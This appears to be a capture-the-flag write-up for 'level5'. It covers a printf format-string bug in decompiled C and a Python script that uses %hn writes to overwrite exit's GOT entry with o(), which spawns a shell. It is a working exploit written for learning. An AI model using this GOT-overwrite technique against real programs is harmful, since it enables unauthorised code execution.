<h1 align="center"> LEVEL 5 </h1>

## 🔍 Analysis of Decompiled [level5](./source.c)
```
void o(void)
{
  system("/bin/sh");
                    // WARNING: Subroutine does not return
  _exit(1);
}

void n(void)
{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
                    // WARNING: Subroutine does not return
  exit(1);
}

void main(void)
{
  n();
  return;
}

```
## What happens?

- The program reads input via fgets() into a large buffer (local_20c).
- Then it calls printf(local_20c); — format string vulnerability!
- Finally, it calls exit(1);

## 💥 Exploit 
Use the format string vulnerability in printf(local_20c) to overwrite a GOT entry so when exit(1) is called, it actually calls o() instead of the normal exit().
### Step 1: Identify the GOT entry for exit
```
$ readelf -r ./level5 | grep exit
08049828  00000207 R_386_JUMP_SLOT   00000000   _exit
08049838  00000607 R_386_JUMP_SLOT   00000000   exit

```
So, exit@GOT is at `0x08049838` 
### Step 2: Find the address of o()
```
$ gdb ./level5
(gdb) info fucntions
...
0x080484a4  o
0x080484c2  n
0x08048504  main
...

```
so the address of o is `0x080484a4`

### Step 3: Exploit with format string

Use the format string vulnerability to write the address of o() into exit@GOT.</br>
When n() calls exit(1), the program actually jumps to o(), spawning a shell.

How to write the address?
- Split o() address into two halves (low 2 bytes and high 2 bytes).
- Write these halves to exit@GOT and exit@GOT + 2 using %hn.
- Use format string to print enough characters for padding.

exploit script using python:
```py
import struct

ret_addr = 0x08049838
win_addr = 0x080484a4

low = win_addr & 0xffff       # 0x84a4
high = (win_addr >> 16)       # 0x0804

addr1 = struct.pack("<I", ret_addr)
addr2 = struct.pack("<I", ret_addr + 2)
print(addr1, addr2)
offset = 4
written = len(addr1) + len(addr2)  # 2 addresses = 8 bytes

pad1 = low - written
pad2 = high - low
if pad1 < 0:
    pad1 += 0x10000
if pad2 < 0:
    pad2 += 0x10000


fmt = "%%%dx%%%d$hn%%%dx%%%d$hn" % (pad1, offset, pad2, offset + 1)

payload = addr1 + addr2 + fmt.encode()

with open("payload.txt", "wb") as f:
    f.write(payload)
print("Payload written with offset %d" % offset)
```
```
(cat payload.txt; cat) | ./level5
whoami
level6
```
